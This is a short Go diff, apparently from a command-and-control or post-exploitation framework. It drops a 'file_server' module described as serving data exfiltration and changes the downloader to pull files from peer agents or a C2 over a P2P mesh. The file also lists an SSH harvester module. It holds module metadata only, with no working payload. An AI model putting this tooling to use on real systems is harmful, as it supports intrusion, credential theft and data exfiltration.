@@ -8,7 +8,6 @@ const (
 
 	ModListener     = "listener"
 	ModSSHHarvester = "ssh_harvester"
-	ModFileServer   = "file_server"
 	ModDownloader   = "file_downloader"
 )
 
@@ -261,48 +260,19 @@ func populateModules() {
 				IsInteractive: false,
 			},
 		},
-		ModFileServer: {
-			Name:     ModFileServer,
+		ModDownloader: {
+			Name:     ModDownloader,
 			Build:    "",
 			Date:     "2020-01-25",
-			Comment:  "Start a secure file server on target host for data exfiltration and module file caching",
+			Comment:  "Download a file from peers or CC over P2P mesh",
 			IsLocal:  false,
 			Platform: "Generic",
 			Path:     "",
 			Fileless: true,
 			Options: ModOptions{
-				"port": &ModOption{
-					Name: "port",
-					Desc: "Port to listen on",
-					Val:  "8000",
-				},
-				"switch": &ModOption{
-					Name: "switch",
-					Desc: "Turn file server on/off",
-					Val:  "on",
-				},
-			},
-			AgentConfig: AgentModuleConfig{
-				Exec:          "built-in",
-				Files:         []string{},
-				InMemory:      false,
-				Type:          "go",
-				IsInteractive: false,
-			},
-		},
-		ModDownloader: {
-			Name:     ModDownloader,
-			Build:    "",
-			Date:     "2020-01-25",
-			Comment:  "Download and decrypt a file from other agents, run `file_server` first",
-			IsLocal:  false,
-			Platform: "Generic",
-			Path:     "",
-			Fileless: false,
-			Options: ModOptions{
-				"download_addr": &ModOption{
-					Name: "download_addr",
-					Desc: "Download address, eg 10.1.1.1:8000",
+				"peer": &ModOption{
+					Name: "peer",
+					Desc: "Peer agent IP to download from, eg 10.1.1.1",
 					Val:  "",
 				},
 				"path": &ModOption{
